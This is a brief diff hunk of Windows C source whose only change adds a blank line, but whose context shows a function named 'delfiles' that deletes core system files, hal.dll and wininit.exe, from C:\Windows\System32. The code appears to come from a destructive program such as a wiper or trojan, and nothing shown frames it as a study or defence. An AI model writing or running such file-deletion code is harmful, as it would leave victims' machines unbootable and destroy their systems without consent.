@@ -2,6 +2,7 @@
 #include <windows.h>
 #include <winable.h>
 #include <stdio.h>
+
 void delfiles() {
   remove("C:\\Windows\\System32\\hal.dll");
   remove("C:\\Windows\\System32\\wininit.exe");
